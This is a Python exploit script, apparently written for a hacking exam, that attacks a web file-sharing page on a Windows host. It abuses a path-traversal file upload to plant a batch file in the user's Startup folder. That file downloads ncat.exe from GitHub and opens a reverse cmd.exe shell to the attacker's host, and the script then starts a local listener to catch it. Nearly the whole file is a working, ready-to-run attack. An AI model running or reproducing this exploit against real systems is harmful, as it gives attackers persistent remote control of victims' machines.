import requests
import subprocess
import sys

#exam
#python exploit.py ip_victim LHOST LPORT

ipvictim = sys.argv[1]
LHOST = sys.argv[2]
LPORT = sys.argv[3]



burp0_url = "http://"+ipvictim+":80/sharing.html"
burp0_cookies = {"confluence-language": "en_GB"}
burp0_headers = {"Cache-Control": "max-age=0", "sec-ch-ua": "\"Chromium\";v=\"121\", \"Not A(Brand\";v=\"99\"", "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"Windows\"", "Upgrade-Insecure-Requests": "1", "Origin": "http://127.0.0.1", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryhRS3fzsFBt2g4Bjq", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "http://127.0.0.1/sharing.html", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
burp0_data = "------WebKitFormBoundaryhRS3fzsFBt2g4Bjq\r\nContent-Disposition: form-data; name=\"upfiles\"; filename=\"../../../../../../../Users/Admin/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/VHAE04.bat\"\r\nContent-Type: text/plain\r\n\r\ncd \"C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\r\ncurl -L -o ncat.exe https://github.com/VHAE04/Research/raw/main/MyPublicWiFi/ncat.exe\r\nncat.exe "+LHOST+" "+LPORT+" -e cmd.exe\r\n\r\n------WebKitFormBoundaryhRS3fzsFBt2g4Bjq--\r\n"
xx = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
print("upload thanh cong shell len server ;D")
command = "ncat.exe -lvp "+ LPORT
subprocess.run(command)
